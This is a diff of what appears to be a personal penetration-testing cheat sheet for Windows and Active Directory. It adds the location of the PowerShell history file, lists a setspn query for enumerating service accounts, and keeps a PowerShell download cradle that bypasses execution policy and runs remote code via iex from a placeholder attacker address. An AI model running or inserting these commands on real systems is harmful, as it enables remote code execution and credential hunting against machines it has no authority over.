@@ -6,9 +6,13 @@
   gpupdate /force      #update the gp group policy. \n
   net share sharename=c:\foldername          # share a folder
   setspn HTTP/nameofhost(sql.inmy.com) inmy\sqladmin
+>powershell history
+>  Powershell saves all previous commands into a file called ConsoleHost_history. This is located at %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 >setspn -T medin -Q ​ */*  //to extract all accouint in SPN, when we have a normal user in a hsot in AD
->
-  //pwershell to downlaod file
+
+
+
+>//pwershell to downlaod file
       powershell -ep bypass;
       iex​(New-Object Net.WebClient).DownloadString('https://YOUR_IP/xx')
       or curl http://xxx/xx -o xx
